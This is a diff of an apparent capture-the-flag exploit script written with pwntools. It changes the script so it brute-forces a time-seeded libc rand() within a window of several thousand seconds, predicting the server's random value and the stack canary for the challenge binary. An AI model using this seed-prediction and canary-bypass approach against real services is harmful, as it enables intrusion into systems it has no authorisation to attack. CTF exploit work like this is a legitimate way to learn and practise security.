@@ -126,20 +126,23 @@ libc = CDLL('libc.so.6')
 
 elf = context.binary = ELF('chal')
 
-while True:
+found = False
+while not found:
     p = remote("amt.rs", 31175)
     #p = process("chal")
     now = int(floor(time.time()))
-    libc.srand(now)
-    canary = libc.rand()
     p.sendlineafter(b"3) Exit", b"1")
     p.recvuntil(b"\n")
     server_random = int(p.recvline())
-    local_random = libc.rand()
-    if server_random == local_random:
-        print("found ", server_random, local_random)
-        break
-    else:
+    for i in range(-2000, 2000):
+        libc.srand(now+i)
+        canary = libc.rand()
+        local_random = libc.rand()
+        if server_random == local_random:
+            print("found ", server_random, local_random)
+            found = True
+            break
+    if not found:
         p.close()
 
 p.sendlineafter(b"3) Exit", b"2")
